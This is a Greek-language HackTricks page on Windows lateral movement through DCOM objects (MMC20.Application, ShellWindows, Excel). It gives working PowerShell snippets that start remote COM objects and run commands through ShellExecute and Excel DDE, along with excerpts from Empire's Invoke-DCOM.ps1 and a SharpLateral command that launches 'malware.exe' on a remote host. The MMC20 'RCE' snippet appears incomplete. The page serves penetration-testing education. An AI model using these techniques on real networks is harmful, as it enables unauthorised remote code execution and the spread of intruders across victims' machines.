# DCOM Exec

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε τις πιο σημαντικές ευπάθειες για να τις διορθώσετε γρηγορότερα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε την αρχική ανάρτηση από [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Τα αντικείμενα Distributed Component Object Model (DCOM) παρουσιάζουν μια ενδιαφέρουσα δυνατότητα για δικτυακές αλληλεπιδράσεις με αντικείμενα. Η Microsoft παρέχει εκτενή τεκμηρίωση για το DCOM και το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Μια λίστα με εφαρμογές DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Το COM αντικείμενο, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει τη συγγραφή ενεργειών snap-in του MMC μέσω σεναρίων. Ιδιαίτερα, αυτό το αντικείμενο περιέχει μια μέθοδο `ExecuteShellCommand` κάτω από το `Document.ActiveView`. Περισσότερες πληροφορίες για αυτήν τη μέθοδο μπορούν να βρεθούν [εδώ](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Ελέγξτε την εκτέλεσή της:

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω δικτύου μέσω μιας εφαρμογής DCOM. Για να αλληλεπιδράσετε απομακρυσμένα με το DCOM ως διαχειριστής, μπορεί να χρησιμοποιηθεί το PowerShell ως εξής:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Αυτή η εντολή συνδέεται στην εφαρμογή DCOM και επιστρέφει μια παράσταση του αντικειμένου COM. Η μέθοδος ExecuteShellCommand μπορεί στη συνέχεια να κληθεί για να εκτελέσει ένα διεργασία στον απομακρυσμένο υπολογιστή. Η διαδικασία περιλαμβάνει τα εξής βήματα:

Έλεγχος μεθόδων:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Αποκτήστε RCE (Απομακρυσμένη Εκτέλεση Κώδικα):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε την αρχική ανάρτηση [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Το αντικείμενο **MMC20.Application** αναγνωρίστηκε ότι δεν έχει σαφείς "LaunchPermissions", προεπιλέγοντας άδειες που επιτρέπουν στους διαχειριστές πρόσβαση. Για περαιτέρω λεπτομέρειες, μπορεί να εξεταστεί ένα νήμα [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του OleView .NET του [@tiraniddo](https://twitter.com/tiraniddo) για το φιλτράρισμα αντικειμένων χωρίς σαφείς άδειες εκκίνησης.

Δύο συγκεκριμένα αντικείμενα, `ShellBrowserWindow` και `ShellWindows`, τονίστηκαν λόγω της έλλειψης σαφών άδειων εκκίνησης. Η απουσία ενός καταχωρίστρου `LaunchPermission` κάτω από `HKCR:\AppID\{guid}` υποδηλώνει ότι δεν υπάρχουν σαφείς άδειες.

###  ShellWindows
Για το `ShellWindows`, το οποίο δεν έχει ένα ProgID, οι μέθοδοι .NET `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν την αρχικοποίηση του αντικειμένου χρησιμοποιώντας το AppID του. Αυτή η διαδικασία εκμεταλλεύεται το OleView .NET για να ανακτήσει το CLSID για το `ShellWindows`. Μόλις αρχικοποιηθεί, είναι δυνατή η αλληλεπίδραση μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε κλήση μεθόδου όπως `Document.Application.ShellExecute`.

Παρείχαν παραδείγματα εντολών PowerShell για την αρχικοποίηση του αντικειμένου και την εκτέλεση εντολών απομακρυσμένα:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Πλευρική Κίνηση με τα Αντικείμενα DCOM του Excel

Η πλευρική κίνηση μπορεί να επιτευχθεί εκμεταλλευόμενη τα αντικείμενα DCOM του Excel. Για λεπτομερείς πληροφορίες, συνίσταται η ανάγνωση της συζήτησης για την εκμετάλλευση του Excel DDE για πλευρική κίνηση μέσω DCOM στο [blog της Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Το έργο Empire παρέχει ένα σενάριο PowerShell, το οποίο δείχνει τη χρήση του Excel για εκτέλεση απομακρυσμένου κώδικα (RCE) με τη χρήση της εκμετάλλευσης των αντικειμένων DCOM. Παρακάτω παρουσιάζονται αποσπάσματα από το σενάριο που είναι διαθέσιμο στο [αποθετήριο GitHub του Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), που δείχνουν διάφορες μεθόδους κατάχρησης του Excel για RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Εργαλεία Αυτοματισμού για Πλευρική Κίνηση

Δύο εργαλεία επισημαίνονται για τον αυτοματισμό αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα PowerShell script που παρέχεται από το έργο Empire και απλοποιεί την εκτέλεση διαφορετικών μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένους υπολογιστές. Αυτό το script είναι προσβάσιμο στο αποθετήριο GitHub του Empire.

- **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την εκτέλεση κώδικα απομακρυσμένα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Αυτόματα Εργαλεία

* Το Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη εκτέλεση όλων των σχολιασμένων τρόπων για την εκτέλεση κώδικα σε άλλες μηχανές.
* Μπορείτε επίσης να χρησιμοποιήσετε το [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Αναφορές

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
